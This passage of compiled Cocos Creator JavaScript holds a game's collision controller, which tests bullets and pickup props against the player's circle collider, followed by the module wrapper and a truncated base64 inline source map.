            if (bullet.node.position.sub(gameRoleController.role.node.position).mag() < Math.max(bullet.node.width, bullet.node.height) + gameRoleController.role.spaceCircleCollider.radius) {
                /** 精密判断 */
                GameCollisionController_1.updateCollider(bullet.collider);
                if (!bRoleUpdateCollider) {
                    GameCollisionController_1.updateCollider(gameRoleController.role.spaceCircleCollider);
                }
                /** 判断圆形与多边形的碰撞 */
                var bContact = false;
                if (bullet.collider instanceof cc.CircleCollider) {
                    bContact = cc.Intersection.circleCircle(bullet.collider.world, gameRoleController.role.spaceCircleCollider.world);
                }
                else {
                    bContact = cc.Intersection.polygonCircle(bullet.collider.world.points, gameRoleController.role.spaceCircleCollider.world);
                }
                if (bContact) {
                    // console.log("========>产生了碰撞..");
                    if (!bullet.contacts.includes(gameRoleController.role)) {
                        // console.log("=======>onCollisionEnter");
                        bullet.contacts.push(gameRoleController.role);
                        bullet.onCollisionEnter(gameRoleController.role.spaceCircleCollider, bullet.collider);
                    }
                    else {
                        // console.log("========>onCollisionStay");
                        bullet.onCollisionStay(gameRoleController.role.spaceCircleCollider, bullet.collider);
                    }
                }
                else {
                    var index = bullet.contacts.indexOf(gameRoleController.role);
                    if (index >= 0) {
                        bullet.contacts.splice(index, 1);
                        bullet.onCollisionExit(gameRoleController.role.spaceCircleCollider, bullet.collider);
                    }
                }
            }
        });
        /** 道具 */
        window['GameEnemysController'].gameProps.forEach(function (prop) {
            if (!prop.on_off) {
                var distance = prop.node.position.sub(gameRoleController.role.node.position).mag();
                if (GameProxy_1.GameProxy.magnetic && !prop.magnetic) {
                    if (distance < 100) {
                        prop.magnetic = true;
                    }
                }
                if (distance < Math.max(prop.node.width, prop.node.height) + gameRoleController.role.spaceCircleCollider.radius) {
                    /** 精密判断 */
                    GameCollisionController_1.updateCollider(prop.collider);
                    if (!bRoleUpdateCollider) {
                        GameCollisionController_1.updateCollider(gameRoleController.role.spaceCircleCollider);
                    }
                    /** 判断圆形与多边形的碰撞 */
                    var bContact = false;
                    if (prop.collider instanceof cc.CircleCollider) {
                        bContact = cc.Intersection.circleCircle(prop.collider.world, gameRoleController.role.spaceCircleCollider.world);
                    }
                    else {
                        bContact = cc.Intersection.polygonCircle(prop.collider.world.points, gameRoleController.role.spaceCircleCollider.world);
                    }
                    if (bContact) {
                        // console.log("========>产生了碰撞..");
                        prop.trigger();
                    }
                }
            }
        });
    };
    var GameCollisionController_1;
    __decorate([
        property(cc.Node)
    ], GameCollisionController.prototype, "enemyBulletLayer", void 0);
    __decorate([
        property(LooseQuadTree_1.default)
    ], GameCollisionController.prototype, "looseQuadTree", void 0);
    GameCollisionController = GameCollisionController_1 = __decorate([
        ccclass
    ], GameCollisionController);
    return GameCollisionController;
}(cc.Component));
exports.default = GameCollisionController;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2dhbWUvR2FtZUNvbGxpc2lvbkNvbnRyb2xsZXIudHMiXSwibmFtZXMiOltdLCJtYXBwaW5ncyI6Ijs7Ozs7Ozs7Ozs7Ozs7OztBQUVBLCtEQUEwRDtBQUcxRCx5Q0FBc0M7QUFJaEMsSUFBQSxLQUFzQixFQUFFLENBQUMsVUFBVSxFQUFsQyxPQUFPLGFBQUEsRUFBRSxRQUFRLGNBQWlCLENBQUM7QUFFMUMsSUFBTSxJQUFJLEdBQUcsRUFBRSxDQUFDLElBQUksQ0FBQztBQUVyQixJQUFJLEtBQUssR0FBRyxFQUFFLENBQUMsRUFBRSxFQUFFLENBQUM7QUFFcEIsU0FBUyxjQUFjLENBQUUsSUFBSSxFQUFFLElBQUksRUFBRSxNQUFNLEVBQUUsTUFBTSxFQUFFLE1BQU0sRUFBRSxNQUFNO0lBQy9ELElBQUksQ0FBQyxHQUFHLElBQUksQ0FBQyxDQUFDLENBQUM7SUFDZixJQUFJLENBQUMsR0FBRyxJQUFJLENBQUMsQ0FBQyxDQUFDO0lBQ2YsSUFBSSxLQUFLLEdBQUcsSUFBSSxDQUFDLEtBQUssQ0FBQztJQUN2QixJQUFJLE1BQU0sR0FBRyxJQUFJLENBQUMsTUFBTSxDQUFDO0lBRXpCLElBQUksR0FBRyxHQUFHLElBQUksQ0FBQyxFQUFFLEVBQUUsR0FBRyxHQUFHLElBQUksQ0FBQyxFQUFFLEVBQUUsR0FBRyxHQUFHLElBQUksQ0FBQyxFQUFFLEVBQUUsR0FBRyxHQUFHLElBQUksQ0FBQyxFQUFFLENBQUM7SUFDL0QsSUFBSSxHQUFHLEdBQUcsSUFBSSxDQUFDLEdBQUcsRUFBRSxHQUFHLEdBQUcsSUFBSSxDQUFDLEdBQUcsQ0FBQztJQUVuQyxJQUFJLEVBQUUsR0FBRyxHQUFHLEdBQUcsQ0FBQyxHQUFHLEdBQUcsR0FBRyxDQUFDLEdBQUcsR0FBRyxDQUFDO0lBQ2pDLElBQUksRUFBRSxHQUFHLEdBQUcsR0FBRyxDQUFDLEdBQUcsR0FBRyxHQUFHLENBQUMsR0FBRyxHQUFHLENBQUM7SUFDakMsSUFBSSxFQUFFLEdBQUcs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